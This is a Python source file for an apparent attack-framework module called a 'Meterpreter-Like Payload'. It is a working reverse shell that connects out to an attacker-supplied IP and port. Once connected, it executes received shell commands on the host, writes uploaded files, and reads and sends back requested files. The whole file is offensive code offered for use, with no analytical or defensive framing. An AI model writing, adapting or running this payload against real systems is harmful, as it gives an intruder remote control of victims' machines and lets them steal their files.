import pyfiglet
from collections import OrderedDict
import socket
import subprocess
import json
import os

MODULE_TYPE = "payload"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Meterpreter-Like Payload in Python',
            'Rank':'Good',
            'Platform':'Windows/Linux/Mac',
            'architectures':'x86/64 bit processors',
            'Description': 'This script simulates a Meterpreter-like payload with basic post-exploitation capabilities.  ',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
            ('RHOST', ('', True,'Enter Attacker IP')),
            ('RPORT', ('', True,'Enter Attacker port'))
           
               
                ])
                }
    def logo(self):
    	title = 'Meterpreter '
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set LHOST <ip_address> | set LPORT <port>, then run")
   
    # Connect to the attacker
    def connect_to_attacker(self,LHOST, LPORT):
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.connect((LHOST, LPORT))
      return sock
    
    
    # Handle commands from the attacker
    def handle_commands(self,sock):
      while True:
        try:
            # Receive command from attacker
            command = sock.recv(1024).decode()
            if not command:
                break
            
            # Parse JSON command
            cmd_data = json.loads(command)
            action = cmd_data.get("action")
            args = cmd_data.get("args", [])
            
            # Execute action
            if action == "shell":
                output = subprocess.getoutput(" ".join(args))
            elif action == "upload":
                with open(args[0], "wb") as f:
                    f.write(args[1].encode())
                output = f"[+] File uploaded: {args[0]}"
            elif action == "download":
                with open(args[0], "rb") as f:
                    file_data = f.read()
                output = json.dumps({"file": args[0], "data": file_data.decode()})
            elif action == "exit":
                break
            else:
                output = "[-] Unknown command"
            
            # Send output back to the attacker
            sock.send(output.encode())
        except Exception as e:
            print(f"[-] Error: {e}")
            break
    #@handle_commands(sock)
    def execute(self):
        self.logo()
        LHOST = self.info['Options']['RHOST'][0]
        LPORT  = self.info['Options']['RPORT'][0]
        sock = self.connect_to_attacker(LHOST, LPORT)
        print(f"[+] Connected to {LHOST}:{LPORT}")
        self.handle_commands(sock)
        sock.close()
        
        
        return f"[+] Waiting for Attacker ..."
    